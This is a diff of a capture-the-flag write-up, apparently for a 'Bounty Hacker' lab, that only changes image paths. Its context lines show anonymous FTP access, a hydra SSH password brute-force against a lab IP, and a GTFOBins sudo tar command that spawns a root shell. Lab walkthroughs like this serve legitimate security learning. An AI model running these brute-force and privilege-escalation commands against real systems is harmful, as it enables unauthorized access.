@@ -41,7 +41,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 - FTP login success: **anonymous login**
 
-![](Bounty_Hacker/assets/img-1.png)
+![](assets/img-1.png)
 
 - Get Specific File To Your Machine:
 
@@ -49,9 +49,9 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 mget file_name
 ```
 
-![](Bounty_Hacker/assets/img-2.png)
+![](assets/img-2.png)
 
-![](Bounty_Hacker/assets/img-3.png)
+![](assets/img-3.png)
 
 ---
 
@@ -77,7 +77,7 @@ cat task.txt
 hydra -l lin -P lock.txt ssh://10.10.187.164
 ```
 
-![](Bounty_Hacker/assets/img-4.png)
+![](assets/img-4.png)
 
 ---
 
@@ -87,14 +87,14 @@ hydra -l lin -P lock.txt ssh://10.10.187.164
 sudo -l
 ```
 
-![](Bounty_Hacker/assets/img-5.png)
+![](assets/img-5.png)
 
 - Search for `tar` Exactly `sudo` in `gtfobins`:
 
-![](Bounty_Hacker/assets/img-6.png)
+![](assets/img-6.png)
 
 ```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-![](Bounty_Hacker/assets/img-7.png)
+![](assets/img-7.png)
